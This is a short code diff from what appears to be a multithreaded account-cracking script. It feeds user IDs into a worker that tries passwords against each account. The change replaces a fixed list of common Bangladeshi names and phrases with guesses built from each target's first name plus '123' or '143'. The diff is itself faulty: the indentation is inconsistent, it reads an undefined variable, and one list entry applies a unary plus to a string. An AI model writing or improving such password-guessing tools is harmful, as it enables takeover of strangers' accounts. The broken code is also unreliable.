@@ -246,8 +246,13 @@ def gxdsfiles(gxdsfiles1):
     # PASSWORD LIST
     with ThreadPool(max_workers=30) as GOXDIES:
         for data in gxdsfiles1:
+          fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
             uid = data.split("|")[0]
-            pwx = ['samiya','taniya','lamiya','sadiya','fatema','i love you','annat','farhan','ariyan','jarif','bangladesh']
+            pwx = [fs+"123",+fs+"143"]
             GOXDIES.submit(gxds_files, uid, pwx)
 
 # LOOP MENU
